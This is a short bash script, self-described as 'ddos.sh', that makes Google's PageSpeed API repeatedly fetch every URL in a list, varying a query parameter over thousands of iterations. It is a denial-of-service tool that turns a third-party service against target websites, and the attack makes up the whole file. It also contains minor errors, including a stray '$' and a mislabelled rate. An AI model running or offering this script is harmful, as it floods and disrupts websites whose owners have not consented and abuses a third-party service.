#!/bin/bash
control_c(){
        tput clear
        rm -f /tmp/tempfile
	echo "Exiting..."
	exit 1
}
trap control_c SIGINT
if [ "$1" ]; then
	if [ -f /sys/class/net/$1/statistics/tx_bytes ]; then
		TX=$((`cat /sys/class/net/$1/statistics/tx_bytes`/1024))
		RX=$((`cat /sys/class/net/$1/statistics/rx_bytes`/1024))
		echo "tx $1: $TX kb/s rx $1: $RX kb/s"
	else
		echo "This interface is not valid"
		exit 1
	fi
	for ((i=5000; i<=8000; i++)); do
        	cat links.txt | while read line; do
	                curl "https://www.googleapis.com/pagespeedonline/v2/runPagespeed?url=$line?sz=$i" --limit-rate "$RX"K -s -O /dev/null $ echo $i;
        	done
	done
else
	echo "Usage: ./ddos.sh eth0 <network-interface>"
fi
